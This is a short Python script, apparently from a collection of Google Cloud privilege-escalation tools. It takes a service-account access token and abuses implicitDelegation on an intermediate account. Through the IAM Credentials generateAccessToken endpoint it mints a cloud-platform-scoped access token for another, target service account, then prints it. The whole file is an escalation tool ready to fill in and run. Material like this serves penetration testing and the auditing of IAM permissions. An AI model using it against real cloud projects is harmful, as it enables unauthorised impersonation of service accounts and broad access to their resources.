#!/usr/bin/env python3

# The SA that you have implicitDelegation on
SERVICE_ACCOUNT_YOU_CAN_DELEGATE = ''
# The SA that the previous Service Account can create access tokens on
TARGET_SERVICE_ACCOUNT = ''
ACCESS_TOKEN = input('Enter an access token to use for authentication (must be a Service Account): ').rstrip()

import requests
import json

key = requests.post(
    f'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{TARGET_SERVICE_ACCOUNT}:generateAccessToken',
    params={'access_token': ACCESS_TOKEN},
    headers={'Content-Type': 'application/json'},
    data={
        'delegates': [f'projects/-/serviceAccounts/{SERVICE_ACCOUNT_YOU_CAN_DELEGATE}'],
        'scope': ['https://www.googleapis.com/auth/cloud-platform']
    }
).json()

print(json.dumps(key, indent=4))
